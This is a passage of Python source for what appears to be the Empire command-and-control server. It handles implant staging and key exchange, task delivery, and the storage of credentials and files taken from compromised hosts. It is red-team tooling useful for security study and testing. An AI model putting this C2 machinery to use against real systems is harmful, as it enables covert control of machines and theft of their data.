import base64
import contextlib
import json
import logging
import secrets
import string
import typing
from pathlib import Path

from pydantic import ValidationError
from sqlalchemy import and_, delete, select
from sqlalchemy.orm import Session
from zlib_wrapper import decompress

from empire.server.api.v2.agent.agent_task_dto import ModulePostRequest
from empire.server.common import credential_parsers, encryption, helpers, packets
from empire.server.common.encryption import AESCipher
from empire.server.core import protocol_constants as proto
from empire.server.core.config.config_manager import empire_config
from empire.server.core.db import models
from empire.server.core.db.base import SessionLocal
from empire.server.core.db.models import AgentTaskStatus
from empire.server.core.hooks import hooks
from empire.server.utils.dotnet_version_util import normalize_dotnet_version
from empire.server.utils.file_util import is_path_within
from empire.server.utils.string_util import is_valid_session_id

if typing.TYPE_CHECKING:
    from empire.server.common.empire import MainMenu


log = logging.getLogger(__name__)

DEFAULT_SESSION_ID = "00000000"


class AgentCommunicationService:
    def __init__(self, main_menu: "MainMenu"):
        self.main_menu = main_menu
        self.agent_service = main_menu.agentsv2
        self.agent_task_service = main_menu.agenttasksv2
        self.agent_socks_service = main_menu.agentsocksv2
        self.credential_service = main_menu.credentialsv2
        self.listener_service = main_menu.listenersv2
        self.ip_service = main_menu.ipsv2
        self.module_service = main_menu.modulesv2

        # internal agent dictionary for the client's session key, funcions, and URI sets
        #   this is done to prevent database reads for extremely common tasks (like checking tasking URI existence)
        #   self.agents[sessionID] = {  'sessionKey' : clientSessionKey,
        #                               'language' : clientLanguage,
        #                               'functions' : [tab-completable function names for a script-import]
        #                            }
        self.agents = {}

        with SessionLocal() as db:
            db_agents = self.agent_service.get_all(db)
            for agent in db_agents:
                self.add_agent_to_cache(agent)

    def add_agent_to_cache(self, agent: models.Agent):
        self.agents[agent.session_id] = {
            "sessionKey": agent.session_key,
            "language": agent.language,
        }

    def is_ip_allowed(self, ip_address):
        return self.ip_service.is_ip_allowed(ip_address)

    @staticmethod
    def _is_path_safe(save_path: Path, download_dir: Path, session_id: str) -> bool:
        """Check if a file path is safe (not a directory traversal attack)."""
        if not is_path_within(save_path, download_dir):
            log.warning(
                "Agent %s attempted skywalker exploit! Path: %s", session_id, save_path
            )
            return False
        return True

    def _ingest_credentials(self, db: Session, agent, tasking, data):
        """Dispatch task output to the credential parser declared on the
        module, or to a prefix-based fallback for ad-hoc invocations.

        Parser exceptions are caught and logged: this runs on every agent
        task response, so a bug in any one parser must not break the comms
        loop. `CredentialService.create_credential` returns a `(cred, err)`
        tuple — dedup collisions (err containing "Duplicate") are ignored,
        any other error is logged at warning level but does not abort
        ingestion or propagate.
        """
        parser = None
        declared_parser_name = None
        module_name = getattr(tasking, "module_name", None) if tasking else None
        if module_name:
            mod = self.module_service.modules.get(module_name)
            if mod and mod.credential_parser:
                declared_parser_name = mod.credential_parser
                parser = credential_parsers.get_parser(declared_parser_name)
                if parser is None:
                    log.error(
                        "Module %s declares unknown credential_parser %r — "
                        "credentials from this module will not be ingested",
                        module_name,
                        declared_parser_name,
                    )
                    return
        if parser is None:
            parser = credential_parsers.detect_by_prefix(data)
        if parser is None:
            return

        try:
            parsed = parser.parse(data, agent)
        except Exception:
            log.exception(
                "credential parser %s raised on task output",
                parser.__class__.__name__,
            )
            return

        if not isinstance(parsed, list):
            log.error(
                "credential parser %s returned %s; expected list — skipping",
                parser.__class__.__name__,
                type(parsed).__name__,
            )
            return

        date_time = helpers.get_datetime()
        for req in parsed:
            req.notes = f"{req.notes} {date_time}" if req.notes else date_time
            try:
                _, err = self.credential_service.create_credential(db, req)
            except Exception:
                # Persist failure (DB integrity error, too-long value, etc.)
                # must not kill the comms loop. Abort the batch so we don't
                # fire more writes on a session that may be in an invalid
                # state; the caller's outer transaction handling takes it
                # from here.
                log.exception(
                    "credential_service raised persisting %s row for %s — "
                    "aborting remainder of this batch",
                    req.credtype,
                    req.username,
                )
                return
            if err and "Duplicate" not in err:
                log.warning(
                    "credential_service.create_credential rejected %s row: %s",
                    req.credtype,
                    err,
                )

    def _decompress_python_data(self, data, filename, session_id):
        log.info(
            f"Compressed size of {filename} download: {helpers.get_file_size(data)}"
        )

        d = decompress.decompress()
        dec_data = d.dec_data(data)
        log.info(
            f"Final size of {filename} wrote: {helpers.get_file_size(dec_data['data'])}"
        )
        if not dec_data["crc32_check"]:
            message = f"File agent {session_id} failed crc32 check during decompression!\n[!] HEADER: Start crc32: {dec_data['header_crc32']} -- Received crc32: {dec_data['dec_crc32']} -- Crc32 pass: {dec_data['crc32_check']}!"
            log.warning(message)
        return dec_data["data"]

    def save_file(  # noqa: PLR0913
        self,
        db: Session,
        session_id,
        path,
        data,
        total_filesize,
        tasking: models.AgentTask,
        language: str,
        append=False,
    ):
        """
        Save a file download for an agent to the appropriately constructed path.
        """
        # todo this doesn't work for non-windows. All files are stored flat.
        parts = path.split("\\")

        # construct the appropriate save path
        download_dir = empire_config.directories.downloads
        save_path = download_dir / session_id / "/".join(parts[0:-1])
        filename = Path(parts[-1]).name
        save_file = save_path / filename

        if not self._is_path_safe(save_file, download_dir, session_id):
            return

        if not save_path.exists():
            save_path.mkdir(parents=True, exist_ok=True)

        # overwrite an existing file
        mode = "ab" if append else "wb"

        if language in ["python", "go"]:
            data = self._decompress_python_data(data, filename, session_id)

        with save_file.open(mode) as f:
            f.write(data)

        if not append:
            location = save_file
            download = models.Download(
                location=str(location),
                filename=filename,
                size=location.stat().st_size,
            )
            db.add(download)
            db.flush()
            tasking.downloads.append(download)

            # We join a Download to a Tasking
            # But we also join a Download to a AgentFile
            # This could be useful later on for showing files as downloaded directly in the file browser.
            agent_file = db.scalars(
                select(models.AgentFile).where(
                    and_(
                        models.AgentFile.path == path,
                        models.AgentFile.session_id == session_id,
                    )
                )
            ).first()

            if agent_file:
                agent_file.downloads.append(download)
                db.flush()

        try:
            bytes_written = save_file.stat().st_size
            percent = round(bytes_written / int(total_filesize) * 100, 2)
        except (ZeroDivisionError, ValueError, OSError):
            percent = 0.0
            log.warning(
                "Agent %s task %s: cannot compute download progress for %s "
                "(total_filesize=%r); reporting 0.0%%",
                session_id,
                tasking.id,
                filename,
                total_filesize,
            )

        message = f"Part of file {filename} from {session_id} saved [{percent}%] to {save_path}"
        log.info(message)

    def save_module_file(self, session_id, path, data, language: str):
        """
        Save a module output file to the appropriate path.
        """
        parts = path.split("/")

        # construct the appropriate save path
        download_dir = empire_config.directories.downloads
        save_path = download_dir / session_id / "/".join(parts[0:-1])
        filename = parts[-1]
        save_file = save_path / filename

        # decompress data if coming from a python agent:
        if "python" in language:
            data = self._decompress_python_data(data, filename, session_id)

        if not self._is_path_safe(save_file, download_dir, session_id):
            return None

        save_path.mkdir(parents=True, exist_ok=True)

        # save the file out

        with save_file.open("wb") as f:
            f.write(data)

        # notify everyone that the file was downloaded
        message = f"File {path} from {session_id} saved"
        log.info(message)

        return save_file

    def _remove_agent(self, db: Session, session_id: str):
        """
        Remove an agent to the internal cache and database.
        We don't hard delete agents for the most part. this is only
        used when the initial agent setup fails.
        """
        self.agents.pop(session_id, None)

        agent = db.scalars(
            select(models.Agent).where(models.Agent.session_id == session_id)
        ).first()
        if agent:
            db.delete(agent)

        message = f"Agent {session_id} deleted"
        log.info(message)

    def _get_agent_nonce(self, db: Session, session_id: str):
        agent = self.agent_service.get_by_id(db, session_id)

        if agent:
            return agent.nonce
        return None

    def _update_dir_list(self, db: Session, session_id: str, response):
        """ "
        Update the directory list
        """
        if session_id in self.agents:
            # get existing files/dir that are in this directory.
            # delete them and their children to keep everything up to date.
            # There's a cascading delete on the table.
            # If there are any linked downloads, the association will be removed.
            # This function could be updated in the future to do updates instead
            # of clearing the whole tree on refreshes.
            this_directory = db.scalars(
                select(models.AgentFile).where(
                    and_(
                        models.AgentFile.session_id == session_id,
                        models.AgentFile.path == response["directory_path"],
                    ),
                )
            ).first()
            if this_directory:
                db.execute(
                    delete(models.AgentFile).where(
                        and_(
                            models.AgentFile.session_id == session_id,
                            models.AgentFile.parent_id == this_directory.id,
                        )
                    )
                )
            else:  # if the directory doesn't exist we have to create one
                # parent is None for now even though it might have one. This is self correcting.
                # If it's true parent is scraped, then this entry will get rewritten
                this_directory = models.AgentFile(
                    name=response["directory_name"],
                    path=response["directory_path"],
                    parent_id=None,
                    is_file=False,
                    session_id=session_id,
                )
                db.add(this_directory)
                db.flush()

            for item in response["items"]:
                db.execute(
                    delete(models.AgentFile).where(
                        and_(
                            models.AgentFile.session_id == session_id,
                            models.AgentFile.path == item["path"],
                        )
                    )
                )
                db.add(
                    models.AgentFile(
                        name=item["name"],
                        path=item["path"],
                        parent_id=None if not this_directory else this_directory.id,
                        is_file=item["is_file"],
                        session_id=session_id,
                    )
                )

    def update_agent_sysinfo(  # noqa: PLR0913
        self,
        db: Session,
        session_id,
        internal_ip="",
        username="",
        hostname="",
        os_details="",
        high_integrity=0,
        process_name="",
        process_id="",
        language_version="",
        language="",
        architecture="",
        dotnet_version: str = "",
    ):
        """
        Update an agent's system information.
        """
        agent = db.scalars(
            select(models.Agent).where(models.Agent.session_id == session_id)
        ).first()

        host = db.scalars(
            select(models.Host).where(
                and_(
                    models.Host.name == hostname,
                    models.Host.internal_ip == internal_ip,
                )
            )
        ).first()
        if not host:
            host = models.Host(name=hostname, internal_ip=internal_ip)
            db.add(host)
            db.flush()

        process = db.scalars(
            select(models.HostProcess).where(
                and_(
                    models.HostProcess.host_id == host.id,
                    models.HostProcess.process_id == process_id,
                )
            )
        ).first()
        if not process:
            process = models.HostProcess(
                host_id=host.id,
                process_id=process_id,
                process_name=process_name,
                user=agent.username,
            )
            db.add(process)
            db.flush()

        agent.internal_ip = internal_ip.split(" ")[0]
        agent.username = username
        agent.hostname = hostname
        agent.host_id = host.id
        agent.os_details = os_details
        agent.high_integrity = high_integrity
        agent.process_name = process_name
        agent.process_id = process_id
        agent.language_version = language_version
        agent.language = language
        agent.architecture = architecture
        parts = [normalize_dotnet_version(p.strip()) for p in dotnet_version.split(",")]
        normalized = ",".join(p for p in parts if p)
        if normalized:
            agent.dotnet_version = normalized
        db.flush()

    def _get_queued_agent_tasks(
        self, db: Session, session_id
    ) -> list[models.AgentTask]:
        """
        Retrieve tasks that have been queued for our agent from the database.
        Set them to 'pulled'.
        """
        if session_id not in self.agents:
            log.debug(f"Agent {session_id} not active.")
            return []

        try:
            tasks, _total = self.agent_task_service.get_tasks(
                db=db,
                agents=[session_id],
                include_full_input=True,
                status=AgentTaskStatus.queued,
            )

            for task in tasks:
                task.status = AgentTaskStatus.pulled
        except AttributeError:
            log.debug("Agent checkin during initialization.")
            return []
        else:
            return tasks

    def _get_queued_agent_temporary_tasks(self, session_id):
        """
        Retrieve temporary tasks that have been queued for our agent
        """
        if session_id not in self.agents:
            log.debug(f"Agent {session_id} not active.")
            return []

        try:
            return self.agent_task_service.get_temporary_tasks_for_agent(session_id)
        except AttributeError:
            log.debug("Agent checkin during initialization.")
            return []

    def _handle_agent_staging(  # noqa: PLR0912 PLR0915 PLR0913 PLR0911
        self,
        db: Session,
        session_id,
        language,
        meta,
        additional,
        enc_data,
        staging_key,
        agent_cert_public_key,
        server_cert_private_key,
        server_cert_public_key,
        listener_options,
        client_ip="0.0.0.0",
    ):
        """
        Handles agent staging/key-negotiation.
        """

        listener_name = listener_options["Name"]["Value"]
        lang_display_names = {
            "POWERSHELL": "PowerShell",
            "PYTHON": "Python",
            "CSHARP": "C#",
            "GO": "Go",
            "IRONPYTHON": "IronPython",
        }
        lang_name = lang_display_names.get(language, language)

        if meta == "STAGE0":
            # step 1 of negotiation -> client requests staging code
            return "STAGE0"

        if meta == "STAGE1":
            # step 3 of negotiation -> client posts public key
            message = f"Agent {session_id} from {client_ip} posted public key"
            log.info(message)

            try:
                message = AESCipher.decrypt_and_verify(
                    staging_key.encode("UTF-8"), enc_data
                )
            except Exception:
                # if we have an error during decryption
                message = f"HMAC verification failed from '{session_id}'"
                log.exception(message)
                return "ERROR: HMAC verification failed"

            if language.lower() == "powershell":
                # Expect: client DH pub (exact 768 bytes, big-endian) || agent_cert (64 bytes)
                if len(message) < proto.STAGE0_MIN_BYTES:
                    log.error(f"Invalid {lang_name} stage0 length from {session_id}")
                    return f"ERROR: Invalid {lang_name} stage0"

                client_pub_be = message[:768]  # 6144-bit MODP, big-endian
                agent_cert = message[768:832]  # 64 bytes

                # Make sure the first field really is an integer
                try:
                    clientPub = int.from_bytes(
                        client_pub_be, byteorder="big", signed=False
                    )
                except Exception:
                    log.exception(f"Bad {lang_name} DH public")
                    return f"ERROR: Invalid {lang_name} DH public key"

                # The agent certificate is mandatory. It used to be skipped when
                # the field was all zeros, which let a caller opt out of
                # verification simply by sending 64 zero bytes.
                if len(agent_cert) != proto.AGENT_CERT_SIZE:
                    log.error(f"Missing agent certificate from {session_id}")
                    return f"Error: Invalid agent certificate from {session_id}"
                try:
                    if not encryption.checkvalid(
                        agent_cert, b"SIGNATURE", agent_cert_public_key
                    ):
                        log.error(f"Invalid agent certificate from {session_id}")
                        return f"Error: Invalid agent certificate from {session_id}"
                except Exception:
                    log.exception("Agent cert parse/verify error")
                    return f"Error: Invalid agent certificate from {session_id}"

                # Continue DH as usual
                serverPub = encryption.DiffieHellman()
                try:
                    serverPub.gen_key(clientPub)
                except Exception:
                    log.exception(
                        f"Invalid {lang_name} DH public key from {session_id}"
                    )
                    return f"ERROR: Invalid {lang_name} DH public key"
                # serverPub.key == the negotiated session key
                message = f"Agent {session_id} from {client_ip} posted valid {lang_name} PUB key"
                log.info(message)

                # add the agent to the database now that it's "checked in"
                delay = listener_options["DefaultDelay"]["Value"]
                jitter = listener_options["DefaultJitter"]["Value"]
                profile = listener_options["DefaultProfile"]["Value"]
                killDate = listener_options["KillDate"]["Value"]
                workingHours = listener_options["WorkingHours"]["Value"]
                lostLimit = listener_options["DefaultLostLimit"]["Value"]
                nonce = helpers.random_string(16, charset=string.digits)
                agent = self.agent_service.create_agent(
                    db,
                    session_id,
                    client_ip,
                    delay,
                    jitter,
                    profile,
                    killDate,
                    workingHours,
                    lostLimit,
                    session_key=serverPub.key.hex(),
                    nonce=nonce,
                    listener=listener_name,
                    language=language,
                )
                self.add_agent_to_cache(agent)

                server_cert = encryption.signature_unsafe(
                    b"SIGNATURE", server_cert_private_key, server_cert_public_key
                )

                # server returns its public key and server_cert, so agent can make a shared secret
                # with the server's public key, and agent can verify the server's authenticity.
                nbytes = (serverPub.publicKey.bit_length() + 7) // 8
                pub_bytes = serverPub.publicKey.to_bytes(nbytes, "big")
                data = nonce.encode("UTF-8") + pub_bytes + server_cert
                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                return packets.build_routing_packet(
                    staging_key, session_id, language, encData=encdata
                )

            if language.lower() == "csharp":
                # check that we recieved a valid certificate size. Message less then 832 can not contain a valid cert
                # 832 comes from public key size + agent cert
                if len(message) < proto.STAGE0_MIN_BYTES:
                    log.error(f"Invalid {lang_name} stage0 length from {session_id}")
                    return f"ERROR: Invalid {lang_name} stage0"

                client_pub_be = message[:768]  # 6144-bit MODP, big-endian
                agent_cert = message[768:832]  # 64 bytes

                # Make sure the first field really is an integer (no "Python fuckery" here)
                try:
                    clientPub = int.from_bytes(
                        client_pub_be, byteorder="big", signed=False
                    )
                except Exception:
                    log.exception(f"Bad {lang_name} DH public")
                    return f"ERROR: Invalid {lang_name} DH public key"

                # The agent certificate is mandatory. It used to be skipped when
                # the field was all zeros, which let a caller opt out of
                # verification simply by sending 64 zero bytes.
                if len(agent_cert) != proto.AGENT_CERT_SIZE:
                    log.error(f"Missing agent certificate from {session_id}")
                    return f"Error: Invalid agent certificate from {session_id}"
                try:
                    if not encryption.checkvalid(
                        agent_cert, b"SIGNATURE", agent_cert_public_key
                    ):
                        log.error(f"Invalid agent certificate from {session_id}")
                        return f"Error: Invalid agent certificate from {session_id}"
                except Exception:
                    log.exception("Agent cert parse/verify error")
                    return f"Error: Invalid agent certificate from {session_id}"
                serverPub = encryption.DiffieHellman()
                try:
                    serverPub.gen_key(clientPub)
                except Exception:
                    log.exception(
                        f"Invalid {lang_name} DH public key from {session_id}"
                    )
                    return f"ERROR: Invalid {lang_name} DH public key"
                # serverPub.key == the negotiated session key

                nonce = helpers.random_string(16, charset=string.digits)

                message = f"Agent {session_id} from {client_ip} posted valid {lang_name} PUB key"
                log.info(message)

                delay = listener_options["DefaultDelay"]["Value"]
                jitter = listener_options["DefaultJitter"]["Value"]
                profile = listener_options["DefaultProfile"]["Value"]
                killDate = listener_options["KillDate"]["Value"]
                workingHours = listener_options["WorkingHours"]["Value"]
                lostLimit = listener_options["DefaultLostLimit"]["Value"]

                # add the agent to the database now that it's "checked in"
                agent = self.agent_service.create_agent(
                    db,
                    session_id,
                    client_ip,
                    delay,
                    jitter,
                    profile,
                    killDate,
                    workingHours,
                    lostLimit,
                    session_key=serverPub.key.hex(),
                    nonce=nonce,
                    listener=listener_name,
                    language=language,
                )
                self.add_agent_to_cache(agent)

                # step 4 of negotiation -> server returns HMAC(AESn(nonce+PUBs))
                data = nonce.encode("UTF-8") + str(serverPub.publicKey).encode("UTF-8")
                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                return packets.build_routing_packet(
                    staging_key, session_id, language, encData=encdata
                )

            if language.lower() == "python":
                if (len(message) < proto.STAGE0_PYTHON_GO_MIN_BYTES) or (
                    len(message) > proto.STAGE0_PYTHON_GO_MAX_BYTES
                ):
                    return (
                        f"Error: Invalid {lang_name} key post format from {session_id}"
                    )

                try:
                    # Python fuckery. We are going to strip the key out of the end
                    int(int.from_bytes(message[:768], byteorder="big", signed=False))
                except Exception:
                    message = f"Invalid {lang_name} key post format from {session_id}"
                    log.exception(message)
                    return message

                # Need to split message of form:
                # public_key for DH (768 bytes) | agent_cert for certs (64 bytes)
                # into separate variables
                clientPub = int.from_bytes(message[:768], byteorder="big", signed=False)
                agent_cert = message[768:832]

                # check verification of agent_cert using its public key so we can verify
                if not encryption.checkvalid(
                    agent_cert, b"SIGNATURE", agent_cert_public_key
                ):
                    message = f"Invalid agent certificate from {session_id}"
                    log.error(message)
                    return f"Error: {message}"

                # We have now verified the agent certificate

                # client posts PUBc key
                serverPub = encryption.DiffieHellman()
                try:
                    serverPub.gen_key(clientPub)
                except Exception:
                    log.exception(
                        f"Invalid {lang_name} DH public key from {session_id}"
                    )
                    return f"ERROR: Invalid {lang_name} DH public key"
                # serverPub.key == the negotiated session key
                message = f"Agent {session_id} from {client_ip} posted valid {lang_name} PUB key"
                log.info(message)

                # add the agent to the database now that it's "checked in"
                delay = listener_options["DefaultDelay"]["Value"]
                jitter = listener_options["DefaultJitter"]["Value"]
                profile = listener_options["DefaultProfile"]["Value"]
                killDate = listener_options["KillDate"]["Value"]
                workingHours = listener_options["WorkingHours"]["Value"]
                lostLimit = listener_options["DefaultLostLimit"]["Value"]
                nonce = helpers.random_string(16, charset=string.digits)
                agent = self.agent_service.create_agent(
                    db,
                    session_id,
                    client_ip,
                    delay,
                    jitter,
                    profile,
                    killDate,
                    workingHours,
                    lostLimit,
                    session_key=serverPub.key.hex(),
                    nonce=nonce,
                    listener=listener_name,
                    language=language,
                )
                self.add_agent_to_cache(agent)

                # sign with server's private key so agent can verify
                server_cert = encryption.signature_unsafe(
                    b"SIGNATURE", server_cert_private_key, server_cert_public_key
                )

                # server returns its public key and server_cert, so agent can make a shared secret
                # with the server's public key, and agent can verify the server's authenticity.
                nbytes = (serverPub.publicKey.bit_length() + 7) // 8
                pub_bytes = serverPub.publicKey.to_bytes(nbytes, "big")
                data = nonce.encode("UTF-8") + pub_bytes + server_cert
                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                return packets.build_routing_packet(
                    staging_key, session_id, language, encData=encdata
                )

            if language.lower() == "go":
                # check that message has a valid block size
                if (len(str(message)) < proto.STAGE0_PYTHON_GO_MIN_BYTES) or (
                    len(str(message)) > proto.STAGE0_PYTHON_GO_MAX_BYTES
                ):
                    message = f"Invalid {lang_name} key post format from {session_id}"
                    log.error(message)
                    return (
                        f"Error: Invalid {lang_name} key post format from {session_id}"
                    )

                try:
                    # Python fuckery. We are going to strip the key out of the end
                    int(int.from_bytes(message[:768], byteorder="big", signed=False))
                except Exception:
                    message = f"Invalid {lang_name} key post format from {session_id}"
                    log.exception(message)
                    return message

                # Need to split message of form:
                # public_key for DH (768 bytes) | agent_cert for certs (64 bytes)
                # into separate variables
                clientPub = int.from_bytes(message[:768], byteorder="big", signed=False)
                agent_cert = message[768:832]

                # check verification of agent_cert using its public key so we can verify
                if not encryption.checkvalid(
                    agent_cert, b"SIGNATURE", agent_cert_public_key
                ):
                    message = f"Invalid agent certificate from {session_id}"
                    log.error(message)
                    return f"Error: Invalid agent certificate from {session_id}"

                # We have now verified the agent certificate

                # client posts PUBc key
                serverPub = encryption.DiffieHellman()
                try:
                    serverPub.gen_key(clientPub)
                except Exception:
                    log.exception(
                        f"Invalid {lang_name} DH public key from {session_id}"
                    )
                    return f"ERROR: Invalid {lang_name} DH public key"
                # serverPub.key == the negotiated session key
                message = f"Agent {session_id} from {client_ip} posted valid {lang_name} PUB key"
                log.info(message)

                # add the agent to the database now that it's "checked in"
                delay = listener_options["DefaultDelay"]["Value"]
                jitter = listener_options["DefaultJitter"]["Value"]
                profile = listener_options["DefaultProfile"]["Value"]
                killDate = listener_options["KillDate"]["Value"]
                workingHours = listener_options["WorkingHours"]["Value"]
                lostLimit = listener_options["DefaultLostLimit"]["Value"]
                nonce = helpers.random_string(16, charset=string.digits)
                agent = self.agent_service.create_agent(
                    db,
                    session_id,
                    client_ip,
                    delay,
                    jitter,
                    profile,
                    killDate,
                    workingHours,
                    lostLimit,
                    session_key=serverPub.key.hex(),
                    nonce=nonce,
                    listener=listener_name,
                    language=language,
                )
                self.add_agent_to_cache(agent)

                # sign with server's private key so agent can verify
                server_cert = encryption.signature_unsafe(
                    b"SIGNATURE", server_cert_private_key, server_cert_public_key
                )

                # server returns its public key and server_cert, so agent can make a shared secret
                # with the server's public key, and agent can verify the server's authenticity.
                nbytes = (serverPub.publicKey.bit_length() + 7) // 8
                pub_bytes = serverPub.publicKey.to_bytes(nbytes, "big")
                data = nonce.encode("UTF-8") + pub_bytes + server_cert
                encdata = AESCipher.encrypt_then_hmac(staging_key.encode("UTF-8"), data)
                return packets.build_routing_packet(
                    staging_key, session_id, language, encData=encdata
                )

            message = f"Agent {session_id} from {client_ip} using an invalid language specification: {language}"
            log.warning(message)
            return f"ERROR: invalid language: {language}"

        if meta == "STAGE2":
            # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
            try:
                session_key = self.agents[session_id]["sessionKey"]
                if isinstance(session_key, str):
                    session_key = bytes.fromhex(session_key)

                message = AESCipher.decrypt_and_verify(session_key, enc_data)
                parts = message.split(b"|")

                if len(parts) < proto.SYSINFO_MIN_PARTS:
                    message = f"Agent {session_id} posted invalid sysinfo checkin format: {message}"
                    log.warning(message)
                    # remove the agent from the cache/database
                    self._remove_agent(db, session_id)
                    return message

                if int(parts[0]) != (int(self._get_agent_nonce(db, session_id)) + 1):
                    message = f"Invalid nonce returned from {session_id}"
                    log.error(message)
                    self._remove_agent(db, session_id)
                    return f"ERROR: Invalid nonce returned from {session_id}"

                message = f"Nonce verified: agent {session_id} posted valid sysinfo checkin format: {message}"
                log.debug(message)

                _listener = str(parts[1], "utf-8")
                domainname = str(parts[2], "utf-8")
                username = str(parts[3], "utf-8")
                hostname = str(parts[4], "utf-8")
                internal_ip = str(parts[5], "utf-8")
                os_details = str(parts[6], "utf-8")
                high_integrity = 1 if str(parts[7], "utf-8").lower() == "true" else 0
                process_name = str(parts[8], "utf-8")
                process_id = str(parts[9], "utf-8")
                language = str(parts[10], "utf-8")
                language_version = str(parts[11], "utf-8")
                architecture = str(parts[12], "utf-8")
                dotnet_version = str(parts[13], "utf-8") if len(parts) > 13 else ""  # noqa: PLR2004

                if domainname:
                    username = f"{domainname}\\{username}"

            except Exception as e:
                message = (
                    f"Exception in agents.handle_agent_staging() for {session_id} : {e}"
                )
                log.exception(message)
                self._remove_agent(db, session_id)
                return f"Error: Exception in agents.handle_agent_staging() for {session_id} : {e}"

            # update the agent with this new information
            self.update_agent_sysinfo(
                db,
                session_id,
                internal_ip=internal_ip,
                username=username,
                hostname=hostname,
                os_details=os_details,
                high_integrity=high_integrity,
                process_name=process_name,
                process_id=process_id,
                language_version=language_version,
                language=language,
                architecture=architecture,
                dotnet_version=dotnet_version,
            )

            self.autorun_tasks(db, session_id)

            # signal everyone that this agent is now active
            message = f"Initial agent {session_id} from {client_ip} now active"
            log.info(message)

            agent_obj = self.agent_service.get_by_id(db, session_id)
            db.expunge(agent_obj)
            hooks.run_hooks(
                hooks.AFTER_AGENT_CHECKIN_HOOK,
                None,
                agent_obj,
            )

            # save the initial sysinfo information in the agent log
            output = f"Agent {session_id} now active"
            self.agent_service.save_agent_log(session_id, output)

            return f"STAGE2: {session_id}"

        message = (
            f"Invalid staging request packet from {session_id} at {client_ip} : {meta}"
        )
        log.error(message)
        return None

    def handle_agent_data(  # noqa: PLR0913
        self,
        staging_key,
        agent_cert_public_key,
        server_cert_private_key,
        server_cert_public_key,
        routing_packet,
        listener_options,
        client_ip="0.0.0.0",
        update_lastseen=True,
    ):
        """
        Take the routing packet w/ raw encrypted data from an agent and
        process as appropriately.

        Abstracted out sufficiently for any listener module to use.
        """

        if len(routing_packet) < proto.ROUTING_PACKET_MIN_BYTES:
            message = f"handle_agent_data(): routingPacket wrong length: {len(routing_packet)}"
            log.error(message)
            return None

        if isinstance(routing_packet, str):
            routing_packet = routing_packet.encode("UTF-8")
        routing_packet = packets.parse_routing_packet(staging_key, routing_packet)
        if not routing_packet:
            return [("", "ERROR: invalid routing packet", "NONE")]

        dataToReturn = []

        # process each routing packet
        for session_id, (language, meta, additional, encData) in routing_packet.items():
            if session_id == DEFAULT_SESSION_ID:
                session_id = self.generate_sessionid()  # noqa: PLW2901

            if not is_valid_session_id(session_id):
                message = f"handle_agent_data(): invalid sessionID {session_id}"
                log.error(message)
                dataToReturn.append(
                    ("", f"ERROR: invalid sessionID {session_id}", "NONE")
                )
            elif meta in ("STAGE0", "STAGE1", "STAGE2"):
                message = f"handle_agent_data(): session_id {session_id} issued a {meta} request"
                log.debug(message)

                with SessionLocal.begin() as db:
                    dataToReturn.append(
                        (
                            language,
                            self._handle_agent_staging(
                                db,
                                session_id,
                                language,
                                meta,
                                additional,
                                encData,
                                staging_key,
                                agent_cert_public_key,
                                server_cert_private_key,
                                server_cert_public_key,
                                listener_options,
                                client_ip,
                            ),
                            additional,
                        )
                    )

            elif session_id not in self.agents:
                message = f"handle_agent_data(): session_id {session_id} not present"
                log.debug(message)

                dataToReturn.append(
                    ("", f"ERROR: session_id {session_id} not in cache!", "NONE")
                )

            elif meta == "TASKING_REQUEST":
                message = f"handle_agent_data(): session_id {session_id} issued a TASKING_REQUEST"
                log.debug(message)
                dataToReturn.append(
                    (
                        language,
                        self.handle_agent_request(session_id, language, staging_key),
                        "NONE",
                    )
                )

            elif meta == "RESULT_POST":
                message = (
                    f"handle_agent_data(): session_id {session_id} issued a RESULT_POST"
                )
                log.debug(message)
                dataToReturn.append(
                    (
                        language,
                        self._handle_agent_response(
                            session_id, encData, update_lastseen
                        ),
                        "NONE",
                    )
                )

            else:
                message = f"handle_agent_data(): session_id {session_id} gave unhandled meta tag in routing packet: {meta}"
                log.error(message)
        return dataToReturn

    def handle_agent_request(self, session_id, language, staging_key):
        """
        Update the agent's last seen time and return any encrypted taskings.
        """
        if session_id not in self.agents:
            message = f"handle_agent_request(): sessionID {session_id} not present"
            log.error(message)
            return None

        # Phase 1: DB work only — release the connection ASAP
        fire_callback_hook = False
        with SessionLocal.begin() as db:
            self.agent_service.update_agent_lastseen(db, session_id)

            # Check if the agent has returned sysinfo yet, so that we don't
            # send out a checkin before stage2 of registration is complete.
            # Scalar select avoids loading the full Agent row just for a
            # truthiness check on a single column.
            hostname = db.scalar(
                select(models.Agent.hostname).where(
                    models.Agent.session_id == session_id
                )
            )
            if hostname:
                fire_callback_hook = True

            tasks = self._get_queued_agent_tasks(db, session_id)
            temp_tasks = self._get_queued_agent_temporary_tasks(session_id)
            tasks.extend(temp_tasks)

            # Flush pending changes (e.g. task status → pulled) before
            # detaching, then expunge so loaded attributes remain
            # accessible after the session closes.
            db.flush()
            db.expunge_all()

        # Fire callback hook AFTER closing the session to avoid holding
        # two pool connections simultaneously.
        if fire_callback_hook:
            hooks.run_hooks(hooks.AFTER_AGENT_CALLBACK_HOOK, None, session_id)

        # Phase 2: file I/O, encryption, packet building (no DB needed)
        if not tasks:
            return None

        all_task_packets = b""

        # build tasking packets for everything we have
        for tasking in tasks:
            input_full = tasking.input_full
            if tasking.task_name in [
                "TASK_CSHARP_CMD_JOB",
                "TASK_CSHARP_CMD_WAIT",
            ]:
                # This is where we read the input file.
                # We could change it to use the linked/tagged download.
                # But this still works.
                with Path(tasking.input_full.split("|")[0]).open("rb") as f:
                    input_full = f.read()
                input_full = base64.b64encode(input_full).decode("UTF-8")
                input_full += tasking.input_full.split("|", maxsplit=1)[1]
            all_task_packets += packets.build_task_packet(
                tasking.task_name, input_full, tasking.id
            )
        # get the session key for the agent
        session_key = self.agents[session_id]["sessionKey"]
        with contextlib.suppress(Exception):
            session_key = bytes.fromhex(session_key)

        # encrypt the tasking packets with the agent's session key
        encrypted_data = AESCipher.encrypt_then_hmac(session_key, all_task_packets)

        return packets.build_routing_packet(
            staging_key,
            session_id,
            language,
            meta="SERVER_RESPONSE",
            encData=encrypted_data,
        )

    def _handle_agent_response(self, session_id, enc_data, update_lastseen=False):
        """
        Takes a sessionID and posted encrypted data response, decrypt
        everything and handle results as appropriate.
        """
        cached_agent = self.agents.get(session_id)
        if cached_agent is None:
